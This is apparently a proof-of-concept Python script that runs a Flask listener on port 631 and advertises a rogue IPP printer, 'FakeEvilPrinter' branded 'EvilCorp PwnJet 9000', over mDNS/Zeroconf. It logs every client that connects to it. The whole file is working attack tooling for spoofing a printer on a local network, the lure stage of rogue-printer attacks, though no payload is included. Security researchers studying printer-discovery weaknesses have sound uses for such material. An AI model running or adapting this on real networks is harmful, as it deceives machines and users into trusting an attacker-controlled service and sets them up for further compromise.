from flask import Flask, request
from zeroconf import Zeroconf, ServiceInfo
import socket
import threading

app = Flask(__name__)

# --- Configuration ---
PRINTER_NAME = "FakeEvilPrinter"
ATTACKER_IP = socket.gethostbyname(socket.gethostname())
IPP_PORT = 631

# --- Log any incoming IPP requests ---
@app.route("/printers/" + PRINTER_NAME, methods=["POST", "GET"])
def ipp_response():
    print(f"[+] IPP request received from {request.remote_addr}")
    return "", 200


@app.route("/" + PRINTER_NAME, methods=["POST", "GET"])
def ipp_responsed():
    print(f"[+] IPP request received from {request.remote_addr}")
    return "", 200


# --- Register fake printer via Zeroconf/mDNS ---
def register_printer():
    desc = {
        "txtvers": "1",
        "qtotal": "1",
        "note": "Fake Printer",
        "product": "(Fake)",
        "printer-state": "3",
        "printer-type": "0x809e4",
        "usb_MFG": "EvilCorp",
        "usb_MDL": "PwnJet 9000",
        "UUID": "00000000-0000-1000-8000-DEADBEEF0001",
        "adminurl": f"http://{ATTACKER_IP}",
        "ty": "EvilCorp PwnJet 9000",
    }

    info = ServiceInfo(
        "_ipp._tcp.local.",
        f"{PRINTER_NAME}._ipp._tcp.local.",
        addresses=[socket.inet_aton(ATTACKER_IP)],
        port=IPP_PORT,
        properties=desc,
        server=f"{PRINTER_NAME}.local.",
    )

    zeroconf = Zeroconf()
    zeroconf.register_service(info)
    print(f"[+] Registered fake printer '{PRINTER_NAME}' at {ATTACKER_IP}:{IPP_PORT}")
    try:
        while True:
            pass
    except KeyboardInterrupt:
        zeroconf.unregister_service(info)
        zeroconf.close()
        print("\n[-] Zeroconf service unregistered.")

# --- Start Flask IPP listener ---
def start_flask():
    app.run(host="0.0.0.0", port=IPP_PORT, debug=False)

# --- Main ---
if __name__ == "__main__":
    print("[*] Starting fake IPP printer and announcing via mDNS/Zeroconf...")
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()

    register_printer()
